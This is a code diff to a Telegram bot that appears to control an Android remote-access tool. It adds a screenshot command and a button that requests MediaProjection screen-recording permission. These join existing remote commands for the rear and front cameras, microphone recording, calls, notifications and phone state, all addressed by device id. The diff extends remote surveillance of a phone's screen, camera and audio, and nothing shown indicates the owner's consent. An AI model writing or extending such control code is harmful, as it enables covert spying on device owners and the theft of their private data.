@@ -226,6 +226,7 @@ COMMANDS = {
     # camera
     "main-camera":    {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
     "selfie-camera":  {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
+    "screenshot":     {"category": "camera", "label": "📸 لقطة شاشة",        "description": "التقاط صورة حقيقية من الشاشة", "needs_param": False},
     # screenshot تمت إزالته من المشروع
     # audio
     "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (اكتب المدة بالثواني)",     "needs_param": True, "param_hint": "10 أو 60 أو 120 (ثانية)"},
@@ -421,7 +422,8 @@ def data_keyboard(did):
 def camera_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
-    # screenshot تمت إزالته
+    # ⚡ زر لقطة شاشة (MediaProjection)
+    kb.add(_cbtn(did,"screenshot"))
     kb.add(_back(did))
     return kb
 
@@ -474,6 +476,12 @@ def permissions_keyboard(did):
            perm_btn("calls", "📞 المكالمات"))
     kb.add(perm_btn("notifications", "🔔 الإشعارات"),
            perm_btn("phone-state", "📱 حالة الهاتف"))
+    # ⚡ زر طلب إذن MediaProjection (تسجيل الشاشة)
+    screen_btn = InlineKeyboardButton(
+        "🖥️ تسجيل الشاشة",
+        callback_data=_cb(did, "cmd", "request-screen-permission")
+    )
+    kb.add(screen_btn)
     kb.add(_back(did))
     return kb
 
